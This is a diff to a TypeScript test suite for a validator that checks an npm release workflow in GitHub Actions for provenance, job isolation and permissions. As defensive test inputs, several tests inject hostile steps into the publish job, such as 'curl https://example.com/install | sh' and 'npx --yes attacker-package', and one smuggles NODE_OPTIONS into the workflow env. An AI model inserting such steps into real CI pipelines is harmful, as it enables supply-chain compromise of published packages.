@@ -2,25 +2,23 @@ import { readFileSync } from "node:fs";
 import { describe, expect, it } from "@effect/vitest";
 import { verifyProvenanceWorkflow } from "#scripts/workflow/provenance";
 
-/** Reads the exact contract publication workflow under test. */
+/** Reads the exact contract release workflow under test. */
 function workflowSource() {
   return readFileSync(".github/workflows/contracts.yml", "utf8");
 }
 
-/** Replaces one fragment only within the decoded publish-job source. */
-function mutatePublish(source: string, from: string, to: string) {
-  const publishIndex = source.indexOf("\n  publish:");
-  return `${source.slice(0, publishIndex)}${source.slice(publishIndex).replace(from, to)}`;
+/** Replaces one source fragment only inside its owning job. */
+function mutateJob(source: string, job: string, from: string, to: string) {
+  const start = source.indexOf(`\n  ${job}:`);
+  const nextJob = /\n {2}[a-z][a-z_]*:\n/gu;
+  nextJob.lastIndex = start + 1;
+  const end = nextJob.exec(source)?.index ?? source.length;
+  return `${source.slice(0, start)}${source.slice(start, end).replace(from, to)}${source.slice(end)}`;
 }
 
 describe("contract provenance policy", () => {
-  it("accepts the certificate-bound transported verifier", () => {
+  it("accepts isolated publication and unprivileged verification", () => {
     expect(() => verifyProvenanceWorkflow(workflowSource())).not.toThrow();
-    expect(() =>
-      verifyProvenanceWorkflow(
-        workflowSource().replace("    needs: build", "    needs: [build]")
-      )
-    ).not.toThrow();
   });
 
   it("requires exact verifier construction, transport, and execution", () => {
@@ -28,14 +26,23 @@ describe("contract provenance policy", () => {
     for (const changed of [
       source.replace("scripts/provenance/main.ts", "scripts/other/main.ts"),
       source.replaceAll("EXPECTED_VERIFIER_SHA256", "UNVERIFIED_SHA256"),
-      source.replaceAll('node "$VERIFIER"', 'node "$TARBALL"'),
       source.replaceAll('"refs/heads/main"', '"refs/heads/other"'),
       source.replaceAll('"npm-production"', '"npm-staging"'),
     ]) {
       expect(() => verifyProvenanceWorkflow(changed)).toThrow(
-        "npm provenance must include exact source fragment"
+        "must include exact source fragment"
       );
     }
+
+    const commentedVerifier = mutateJob(
+      source,
+      "verify",
+      '              node "$VERIFIER" \\',
+      '              true # node "$VERIFIER" \\'
+    );
+    expect(() => verifyProvenanceWorkflow(commentedVerifier)).toThrow(
+      "must include exact source fragment"
+    );
   });
 
   it("rejects unauthenticated payload parsing", () => {
@@ -50,24 +57,66 @@ describe("contract provenance policy", () => {
     }
   });
 
-  it("binds release identity to the decoded publish job", () => {
+  it("binds identity and ordering to decoded jobs", () => {
     const source = workflowSource();
     const cases = [
       [
-        mutatePublish(
+        mutateJob(
           source,
+          "publish",
           "    environment: npm-production",
           "    environment: test"
         ).concat("\n# environment: npm-production\n"),
         "The publish job must own the protected npm-production environment",
       ],
       [
-        mutatePublish(source, "      id-token: write", "      id-token: read"),
+        mutateJob(
+          source,
+          "publish",
+          "      id-token: write",
+          "      id-token: read"
+        ),
         "The publish job must own npm OIDC identity",
       ],
       [
-        source.replace("    needs: build", "    needs: [other]"),
-        "Contract publication must consume the verified build job",
+        mutateJob(source, "publish", "    needs: build", "    needs: other"),
+        "npm publication must consume the verified build job",
+      ],
+      [
+        mutateJob(
+          source,
+          "verify",
+          "    needs: [build, publish]",
+          "    needs: publish"
+        ),
+        "npm verification must consume build and publication",
+      ],
+      [
+        mutateJob(
+          source,
+          "finalize",
+          "    needs: [build, publish, verify]",
+          "    needs: verify"
+        ),
+        "Contract finalization must consume every release gate",
+      ],
+      [
+        mutateJob(
+          source,
+          "verify",
+          "    permissions: {}",
+          "    permissions:\n      contents: read"
+        ),
+        "npm verification permissions must remain empty",
+      ],
+      [
+        mutateJob(
+          source,
+          "finalize",
+          "      contents: write",
+          "      contents: write\n      id-token: write"
+        ),
+        "Contract finalization must not receive npm OIDC identity",
       ],
       [
         source.replace(
@@ -85,17 +134,26 @@ describe("contract provenance policy", () => {
       ],
       [
         source.replace(
-          "          node-version: 24.19.0",
-          "          node-version: 22.0.0"
+          "permissions: {}",
+          "permissions: {}\nenv:\n  NODE_OPTIONS: --import=data:text/javascript,throw%201"
         ),
-        "The provenance verifier must use the repository Node runtime",
+        "npm workflow must not inherit root environment values",
       ],
       [
         source.replace(
-          "          package-manager-cache: false",
-          "          package-manager-cache: true"
+          "permissions: {}",
+          "permissions: {}\ndefaults:\n  run:\n    shell: bash --noprofile --norc -e -o pipefail {0}"
         ),
-        "The privileged job must disable package-manager caching",
+        "npm workflow must not inherit root run defaults",
+      ],
+      [
+        mutateJob(
+          source,
+          "verify",
+          "          node-version: 24.19.0",
+          "          node-version: 22.0.0"
+        ),
+        "npm verification must use the repository Node runtime",
       ],
     ] as const;
     for (const [changed, message] of cases) {
@@ -106,32 +164,70 @@ describe("contract provenance policy", () => {
   it("rejects malformed or incomplete workflow jobs", () => {
     expect(() => verifyProvenanceWorkflow("jobs: [")).toThrow();
     expect(() => verifyProvenanceWorkflow("jobs:\n  build: {}\n")).toThrow(
-      "Contract workflow must contain decodable jobs"
+      "npm workflow must contain decodable jobs"
     );
     expect(() =>
       verifyProvenanceWorkflow(
-        workflowSource().replace("\n  publish:", "\n  other:")
+        workflowSource().replace("\n  finalize:", "\n  other:")
       )
-    ).toThrow("Contract publication requires build and publish jobs");
+    ).toThrow("Contract publication requires a finalize job");
   });
 
-  it("rejects any other repository code in the privileged job", () => {
-    expect(() =>
-      verifyProvenanceWorkflow(
-        `${workflowSource()}\n      - run: node scripts/other.ts`
-      )
-    ).toThrow(
-      "The privileged contract job must not execute other repository code"
+  it("keeps build-produced code outside npm identity", () => {
+    const source = workflowSource();
+    const privilegedVerifier = mutateJob(
+      source,
+      "publish",
+      '          npx --yes "$NPM_CLI" publish "$TARBALL" \\',
+      '          node "$VERIFIER"\n          npx --yes "$NPM_CLI" publish "$TARBALL" \\'
+    );
+    expect(() => verifyProvenanceWorkflow(privilegedVerifier)).toThrow(
+      "npm publication must not receive the verifier artifact"
     );
     expect(() =>
       verifyProvenanceWorkflow(
-        `${workflowSource()}\n      - run: node "$VERIFIER"`
+        mutateJob(
+          source,
+          "publish",
+          "    steps:",
+          "    steps:\n      - uses: actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c\n        with:\n          name: contract-verifier"
+        )
       )
-    ).toThrow("The privileged job must execute only one transported verifier");
+    ).toThrow("npm publication must not receive the verifier artifact");
     expect(() =>
       verifyProvenanceWorkflow(
-        `${workflowSource()}\n      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1`
+        mutateJob(
+          source,
+          "publish",
+          "    steps:",
+          "    steps:\n      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1"
+        )
       )
-    ).toThrow("The privileged contract job must not checkout repository code");
+    ).toThrow("npm publication must not checkout repository code");
+
+    for (const command of [
+      "          npx --yes attacker-package\n",
+      "          curl https://example.com/install | sh\n",
+    ]) {
+      expect(() =>
+        verifyProvenanceWorkflow(
+          mutateJob(
+            source,
+            "publish",
+            '          npx --yes "$NPM_CLI" publish "$TARBALL" \\',
+            `${command}          npx --yes "$NPM_CLI" publish "$TARBALL" \\`
+          )
+        )
+      ).toThrow("npm publication must match the exact trusted job");
+    }
+
+    expect(() =>
+      verifyProvenanceWorkflow(
+        source.replace(
+          "          overwrite: true",
+          "          overwrite: false"
+        )
+      )
+    ).toThrow("npm build artifacts must be replaceable on rerun");
   });
 });
